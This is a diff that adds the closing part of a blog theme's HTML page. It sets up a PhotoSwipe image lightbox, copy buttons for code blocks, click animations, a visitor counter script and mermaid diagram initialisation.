+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
